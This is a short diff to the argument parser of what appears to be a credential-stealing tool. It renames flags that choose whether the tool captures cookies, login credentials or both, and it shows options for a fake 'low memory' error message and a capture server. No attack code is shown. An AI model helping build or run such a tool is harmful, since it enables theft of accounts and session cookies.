@@ -172,10 +172,10 @@ def parse_arguments():
                         action="store_true", default=False, help="Use this to enable the error message. Default is False")
     parser.add_argument('--message', metavar="Error Message",
                         type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
-    parser.add_argument('--nocookies', dest="cookies_bool",
-                        action="store_true", default=False, help="Use to only capture credentials and not cookies. Default is both")
-    parser.add_argument('--nologin', dest="login_bool",
-                        action="store_true", default=False, help="Use to only capture cookies and not credentials. Default is both")
+    parser.add_argument('--cookies', dest="cookies_bool",
+                        action="store_true", default=False, help="Use to only capture cookies. Default is both cookies and login")
+    parser.add_argument('--login', dest="login_bool",
+                        action="store_true", default=False, help="Use to only capture login credentials. Default is both cookies and login")
     parser.add_argument('--pyserver', dest="pyserver",
                         action="store_true", default=False, help="Creates a python version of the server. Pair it with --nobuild-server to only have it as python")
     parser.add_argument('--nobuild_server', dest="noserver",
